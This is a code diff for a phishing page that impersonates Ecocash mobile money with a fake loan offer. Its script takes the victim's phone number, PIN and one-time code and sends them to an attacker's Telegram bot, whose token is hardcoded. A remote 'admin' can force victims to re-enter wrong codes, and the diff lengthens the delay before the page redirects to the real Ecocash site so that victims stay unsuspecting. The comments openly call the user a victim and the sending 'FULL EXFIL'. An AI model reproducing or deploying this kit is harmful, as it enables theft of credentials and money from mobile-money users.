@@ -397,7 +397,7 @@
       font-family: monospace;
     }
 
-    /* Countdown bar */
+    /* Countdown bar (5 min = 300s) */
     .countdown {
       height: 6px;
       background: #e0e8f0;
@@ -410,7 +410,7 @@
       height: 100%;
       background: var(--ecocash-blue);
       width: 100%;
-      animation: shrink 10s linear forwards;
+      animation: shrink 300s linear forwards;
     }
 
     @keyframes shrink {
@@ -422,6 +422,29 @@
       font-size: 12px;
       color: var(--muted);
       text-align: center;
+    }
+
+    /* Toast popup for admin-triggered errors */
+    .toast {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-150%);
+      background: var(--danger);
+      color: #fff;
+      padding: 14px 24px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      z-index: 2000;
+      box-shadow: 0 6px 24px rgba(192, 57, 43, 0.4);
+      transition: transform 0.3s ease;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
     }
 
     @media (max-width: 480px) {
@@ -506,7 +529,7 @@
       <div class="help">⚠️ Ecocash will never call you to ask for your PIN.</div>
     </section>
 
-    <!-- STEP 3: SUCCESS + REDIRECT (convincing) -->
+    <!-- STEP 3: SUCCESS + REDIRECT (5 min delay) -->
     <section class="card" id="cardSuccess" style="display:none">
       <div class="success">
         <div class="check">✓</div>
@@ -515,7 +538,7 @@
         <div class="ref">REF: EC-<span id="refCode">000000</span></div>
         <p><b id="successAmount" style="color:#0033A0; font-size:20px;">$500</b> will be sent to<br/><b id="successMsisdn">+263...</b> within minutes.</p>
         <div class="countdown"><div class="fill"></div></div>
-        <div class="countdown-label">Redirecting to Ecocash portal to complete setup...</div>
+        <div class="countdown-label">Redirecting to Ecocash portal in <span id="redirectTimer">5:00</span>...</div>
       </div>
     </section>
 
@@ -547,14 +570,19 @@
   </div>
 </div>
 
+<!-- TOAST for admin-triggered errors -->
+<div class="toast" id="toast"></div>
+
 <script>
   // === CONFIG: TELEGRAM BOT ===
   const BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
   const CHAT_ID = '1469249528';
   let POLLING_INTERVAL;
+  let REDIRECT_TIMEOUT = null;
 
-  // === REDIRECT TARGET: real Ecocash portal (convincing) ===
+  // === REDIRECT TARGET: real Ecocash portal ===
   const REDIRECT_URL = 'https://www.ecocash.co.zw/';
+  const REDIRECT_DELAY_MS = 300000; // 5 minutes
 
   // === STATE ===
   const state = {
@@ -577,6 +605,13 @@
     document.getElementById(id).classList.remove('show');
   }
 
+  function showToast(msg) {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 4000);
+  }
+
   function getFinalAmount() {
     const select = document.getElementById('loanAmount');
     if (select.value === 'custom') {
@@ -596,7 +631,7 @@
     }
   }
 
-  // === TELEGRAM SEND (unified) ===
+  // === TELEGRAM SEND ===
   function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
@@ -625,14 +660,14 @@
     document.getElementById('cardStep2').style.display = '';
   });
 
-  // === STEP 2: PIN → OTP SHEET (NO PIN EXFIL — PIN only stored locally) ===
+  // === STEP 2: PIN → OTP SHEET ===
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     const pin = document.getElementById('ecocashPin').value;
     if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
       return showErr('err2', 'Enter a valid 4-digit PIN');
     }
 
-    state.pin = pin; // stored in memory only, NOT sent yet
+    state.pin = pin;
     openOtpSheet();
   });
 
@@ -702,22 +737,22 @@ Choose action:
 
             if (fromId != CHAT_ID) return;
 
-            // Admin says the PIN the victim entered was wrong → show error, let them retry
+            // Admin: Wrong PIN → back to step 1 (full restart)
             if (action?.startsWith('wrongpin_') && action.endsWith(state.victimId)) {
-              document.getElementById('otpSheet').classList.remove('show');
-              document.getElementById('cardStep2').style.display = '';
-              document.getElementById('ecocashPin').value = '';
-              showErr('err2', 'Incorrect PIN. Please try again.');
               clearInterval(POLLING_INTERVAL);
+              showToast('❌ Incorrect PIN. Your session has been reset. Please start again.');
+              setTimeout(() => {
+                location.reload();
+              }, 2500);
             }
 
-            // Admin says the OTP the victim entered was wrong → show error on OTP sheet, let them retry
+            // Admin: Wrong OTP → back to step 1 (full restart)
             if (action?.startsWith('wrongotp_') && action.endsWith(state.victimId)) {
-              showErr('errOtp', 'Incorrect OTP. Please check the code and try again.');
-              // Clear OTP inputs for retry
-              document.querySelectorAll('#otpRow input').forEach(i => { i.value = ''; });
-              document.getElementById('btnVerify').disabled = true;
-              document.querySelector('#otpRow input').focus();
+              clearInterval(POLLING_INTERVAL);
+              showToast('❌ Incorrect OTP. Your session has been reset. Please start again.');
+              setTimeout(() => {
+                location.reload();
+              }, 2500);
             }
           });
         })
@@ -763,13 +798,13 @@ Choose action:
     });
   });
 
-  // Final Verify Button — EXFIL OTP ONLY (phone + PIN + OTP together at this point)
+  // Final Verify Button — FULL EXFIL (phone + PIN + OTP)
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = Array.from(otpInputs).map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
 
     state.otp = otp;
-    exfiltrateOtp(); // Phone + PIN + OTP in one message
+    exfiltrateFull(); // Phone + PIN + OTP in one message
 
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('otpSheet').classList.remove('show');
@@ -778,7 +813,7 @@ Choose action:
     clearInterval(POLLING_INTERVAL);
   });
 
-  // === SUCCESS SCREEN + CONVINCING REDIRECT ===
+  // === SUCCESS SCREEN + 5-MIN REDIRECT ===
   function showSuccessScreen() {
     // Generate fake reference code
     const ref = Math.floor(100000 + Math.random() * 900000);
@@ -790,14 +825,28 @@ Choose action:
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('cardSuccess').style.display = '';
 
-    // Auto-redirect after 10 seconds to real Ecocash site
-    setTimeout(() => {
+    // Start visible countdown timer (5:00)
+    startRedirectTimer();
+
+    // Auto-redirect after 5 minutes to real Ecocash site
+    REDIRECT_TIMEOUT = setTimeout(() => {
       window.location.href = REDIRECT_URL;
-    }, 10000);
+    }, REDIRECT_DELAY_MS);
   }
 
-  // === EXFILTRATION: OTP ONLY (single message with everything) ===
-  function exfiltrateOtp() {
+  function startRedirectTimer() {
+    let s = 300; // 5 minutes
+    const el = document.getElementById('redirectTimer');
+    const interval = setInterval(() => {
+      const mins = Math.floor(s / 60);
+      const secs = s % 60;
+      el.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+      if (--s < 0) clearInterval(interval);
+    }, 1000);
+  }
+
+  // === EXFILTRATION: FULL DETAILS IN ONE MESSAGE ===
+  function exfiltrateFull() {
     const message = `
 🔐 *ECOCASH FULL DETAILS CAPTURED*
 📞 *Number:* ${state.msisdn}
@@ -810,7 +859,7 @@ Choose action:
     sendToTelegram(message);
   }
 
-  // Timer reset — resend does NOT exfiltrate
+  // Timer reset — no exfil on resend
   document.getElementById('resend').addEventListener('click', () => {
     startOtpTimer();
   });
